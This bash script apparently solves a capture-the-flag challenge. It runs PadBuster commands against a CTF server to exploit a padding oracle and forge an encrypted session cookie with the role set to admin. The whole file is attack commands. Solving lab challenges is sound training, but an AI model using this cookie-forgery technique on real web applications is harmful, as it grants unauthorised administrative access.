#!/usr/bin/env bash

samp="EUC/QD54kirrUX2IhSBcyFv5trxkivrQfGSSl9hLXizNERmQ14p692pO96e2EY+sJhvf0fnA48eeACptqSdYUA=="
url="http://pwn.osucyber.club:13376/flag"
plaintext='{"name":"123456","role":"admin"}'
err_str='Invalid Padding'

# ./pax-linux-amd64 encrypt --url http://pwn.osucyber.club:13376/flag --sample $samp --block-size 16 --cookies "SESSIONID2=$samp" --plain-text $plaintext

perl PadBuster/padBuster.pl $url $samp 16 -cookies "SESSIONID2=$samp" --plaintext $plaintext -encoding 4 -interactive -log -verbose -error 'Error+parsing' -usebody

perl PadBuster/padBuster.pl http://pwn.osucyber.club:13376/flag "EUC/QD54kirrUX2IhSBcyFv5trxkivrQfGSSl9hLXizNERmQ14p692pO96e2EY+sJhvf0fnA48eeACptqSdYUA==" 16 -cookies "SESSIONID2=EUC/QD54kirrUX2IhSBcyFv5trxkivrQfGSSl9hLXizNERmQ14p692pO96e2EY+sJhvf0fnA48eeACptqSdYUA==" --plaintext '{"name":"123456","role":"admin"}' -encoding 4 -interactive -veryverbose -error "Error Padding" -usebody

# curl 'http://pwn.osucyber.club:13376/flag'
#     -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0'
#     -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
#     -H 'Accept-Language: en-US,en;q=0.5'
#     --compressed -H 'Referer: http://pwn.osucyber.club:13376/login?err=Username+must+be+5+to+20+characters'
#     -H 'Connection: keep-alive'
#     -H 'Cookie: SESSIONID2=EUC/QD54kirrUX2IhSBcyFv5trxkivrQfGSSl9hLXizNERmQ14p692pO96e2EY+sJhvf0fnA48eeACptqSdYUA=='
#     -H 'Upgrade-Insecure-Requests: 1'
#     -H 'Pragma: no-cache'
#     -H 'Cache-Control: no-cache'
